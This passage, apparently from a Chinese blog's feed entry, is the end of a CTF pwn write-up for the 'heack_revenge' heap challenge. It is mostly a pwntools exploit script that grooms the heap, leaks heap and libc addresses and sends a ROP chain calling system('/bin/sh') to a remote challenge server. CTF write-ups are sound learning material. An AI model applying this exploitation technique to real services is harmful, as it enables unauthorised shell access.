class="line">    sla(<span class="string">b&#x27;Enter index (0-15): &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;Enter diary content size (1-2048): &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    ru(<span class="string">b&#x27;Input your content: &#x27;</span>)</span><br><span class="line">    p.send(<span class="built_in">chr</span>(tty.CEOF))</span><br><span class="line">    ru(<span class="string">b&#x27;Read failed!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choose an option: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Enter index to destroy (0-15): &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choose an option: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Enter index to view (0-15): &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">esc</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Choose an option: &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./vul2&quot;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;43.138.2.216&#x27;</span>,<span class="number">19999</span>)</span><br><span class="line">note()</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x50</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x3f0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x500</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">esc()</span><br><span class="line">fight(<span class="string">b&#x27;A&#x27;</span> * (<span class="number">259</span> - <span class="number">0xe0</span>) + <span class="string">b&#x27;\x37&#x27;</span> + <span class="string">b&#x27;\x6A&#x27;</span>)</span><br><span class="line">hp()</span><br><span class="line">hp()</span><br><span class="line">hp()</span><br><span class="line">hp()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    attack()</span><br><span class="line">note()</span><br><span class="line">view(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">b&#x27;---\n&#x27;</span>)</span><br><span class="line">heap_base=(u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)))&lt;&lt;<span class="number">12</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x10</span>,p64(he(<span class="number">0xb90</span>))+p64(he(<span class="number">0x300</span>)))</span><br><span class="line">view(<span class="number">6</span>)</span><br><span class="line">ru(<span class="string">b&#x27;---\n&#x27;</span>)</span><br><span class="line">libc_base=uu64()-<span class="number">0x203b20</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">rdi=li(<span class="number">0x000000000010f75b</span>)</span><br><span class="line">system,binsh=getshell()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(rdi+<span class="number">1</span>)*<span class="number">0x81</span>+p64(rdi)+p64(binsh)+p64(system)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x480</span>,payload)</span><br><span class="line">esc()</span><br><span class="line">ru(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure><p>(我的堆风水比较麻烦，官方wp堆风水只需要泄露libc即可，不需要泄露heap，<a href="https://hust-l3hsec.feishu.cn/wiki/WjlUwIAahiXhlykwIe7c5V57nPb">官方wp</a>)</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;heack-revenge&quot;&gt;&lt;a href=&quot;#heack-revenge&quot; class=&quot;headerlink&quot; title=&quot;heack_revenge&quot;&gt;&lt;/a&gt;heack_revenge&lt;/h1&gt;&lt;p&gt;这个题比赛中没做出来，赛后复现一下&lt;/p&gt;
&lt;ol&gt;</summary>
      
    
    
    
    
    <category term="pwn" scheme="https://gggtaotao.github.io/tags/pwn/"/>
    
    <category term="堆" scheme="https://gggtaotao.github.io/tags/%E5%A0%86/"/>
    
    <category term="L3" scheme="https://gggtaotao.github.io/tags/L3/"/>
    
  </entry>
  
</feed>
